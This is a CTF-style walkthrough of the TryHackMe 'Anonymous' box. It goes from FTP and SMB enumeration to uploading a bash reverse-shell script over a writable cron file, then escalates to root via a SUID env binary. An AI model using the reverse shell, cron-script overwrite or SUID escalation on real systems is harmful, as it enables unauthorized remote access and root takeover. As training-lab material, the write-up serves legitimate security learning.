---
published: true
image: 'https://imgur.com/8CWJ7mY.png'
title: Anonymous - TryHackMe Walkthrough
category: Writeup
author: F3dai
---
"Try to get the two flags!  Root the machine and prove your understanding of the fundamentals! This is a virtual machine meant for beginners. Acquiring both flags will require some basic knowledge of Linux and privilege escalation methods."

This is a TryHackMe box. To access this you must sign up to [https://tryhackme.com/](https://tryhackme.com/). 

**URL:** [Anonymous](https://www.tryhackme.com/room/anonymous#)

**Difficulty:** Medium

**Author:** Nameless0ne

## Enumeration

We are given the IP 10.10.37.186. Run an nmap scan with the following command:

<pre>nmap -p- -A -T4 -o portscan 10.10.37.186</pre>

Here are the open ports:

<pre>PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.6.63
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
</pre>

I will start by investigating the FTP port (21). According to our portscan, Anonymous login is allowed:

<pre>Anonymous FTP login allowed</pre>

So let's see what is on the FTP server:

<pre>ftp 10.10.37.186
Anonymous</pre>

There is a directory called scripts.

![ftp](https://imgur.com/8Q0bKZQ.png)

Transfer all the files over to the local machine so we can inspect them.

<pre>get clean.sh
get removed_files.log
get to_do.txt</pre>

**to_do.txt**:

![to do](https://imgur.com/Ae29iuW.png)

**clean.sh**:

<pre>#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
</pre>

This looks like a script to clear up files in /tmp.

**removed_files.log**:

![log](https://imgur.com/pATZXEN.png)

clean.sh uses this file as a log.

Moving onto the next port, we don't have any credentials for SSH so let's investigate the 2 smb ports. 

I used *smbclient* to get a list of the available shares and began to enumerate them for information. This is an "ftp-like" client to access SMB/CIFS resources on servers.

<pre>smbclient -L \\anonymous -I 10.10.37.186</pre>

![smbclient](https://imgur.com/yQpl6Zv.png)

<pre>Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
pics            Disk      My SMB Share Directory for Pics
IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))</pre>

The disk share "pics" looks interesting. It says it is used as a directory for "pics".

Let's explore this share.

<pre>smbclient //10.10.37.186/pics</pre>

![ls samba](https://imgur.com/1p041cR.png)

I transferred these over as I did with the FTP files, they are just pictures of dogs. 

![dog1](https://imgur.com/mTwFqHy.png)

![dog2](https://imgur.com/K0Oyjp0.png)

I transferred these over as I did with the FTP files, they are just pictures of dogs.

The only interesting file I found was the script on the ftp server. This script could potentially be a cron job which we could modify to execute our own code.

The software utility **cron** is a **time-based job scheduler** in Unix-like computer operating systems.

Since the FTP allows for anyone to log in, we can upload our own script with an identical name. So let's start by creating our own script on our local machine. 

Refer to this article for a reverse shell cheatsheet:

[Reverse Shell Cheatsheet - CyberGoat](/cheatsheet/Reverse_Payload_Cheatsheet/)

We'll be using this one-liner:

<pre>bash -i &gt;&amp; /dev/tcp/[YOUR TRYHACKME IP ADDRESS]/4444 0&gt;&amp;1</pre>

Look at your interfaces with ifconfig, your TryHackMe IP should be on interface "tun0" on similar. 

Create the file:

![nano](https://imgur.com/NwCUasV.png)

Code:

<pre>#!/bin/bash
bash -i &gt;&amp; /dev/tcp/10.9.6.63/4444 0&gt;&amp;1</pre>

Connect to the FTP server again:

<pre>ftp 10.10.37.186
Anonymous
cd scripts
put clean.sh</pre>

![put ftp](https://imgur.com/0M7SFcg.png)

Now set up a netcat listener on the specified port:

<pre>nc -nvlp 4444</pre>

I almost immediately got a connection:

![netcat](https://imgur.com/6e4dqPe.png)

I am logged in as "namelessone". The user flag is in the user's home directory:

![user.txt](https://imgur.com/AySUphG.png)

## Privilege Escalation

Pretty straight forward so far. Just modifying the script to get a reverse shell.

sudo -l doesn't work so let's check the SUID binaries. If you are unsure about finding and exploiting SUID binaries, I recommend reading this article:

[Null Byte - Exploit SUID Binaries](https://null-byte.wonderhowto.com/how-to/find-exploit-suid-binaries-with-suid3num-0215789/)

And here is a very recent TryHackMe box which included the exploitation of a SUID Binary:

[CyberGoat - BoilerCTF TryHackMe](https://www.cybergoat.co.uk/writeup/Boiler/)

To get a list of all SUID binaries, execute the following command:

<pre>find / -user root -perm -4000 -print 2>/dev/null</pre>

This returns a rather large list of binaries:

<pre>
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd                
/bin/umount                        
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo</pre>

GTFOBins is an excellent website which has compiled a list of exploitable SUID binaries, use this as a reference:

[GTFOBins](https://gtfobins.github.io/)

One of the binaries on our system is "/usr/bin/env". GTFOBins has a page on this binary:

[GTFOBins /env](https://gtfobins.github.io/gtfobins/env/)

Let's take advantage of this we can run the following from our current user shell:

<pre>/usr/bin/env /bin/sh -p</pre>

![root](https://imgur.com/QE4DsJM.png)

We are root, the flag is in /root/root.txt

![root flag](https://imgur.com/p8r2NbZ.png)

This was a relatively easy box, I wouldn't personally rate it medium. It is good for beginners who want to improve their enumeration and privilege escalation skills. 





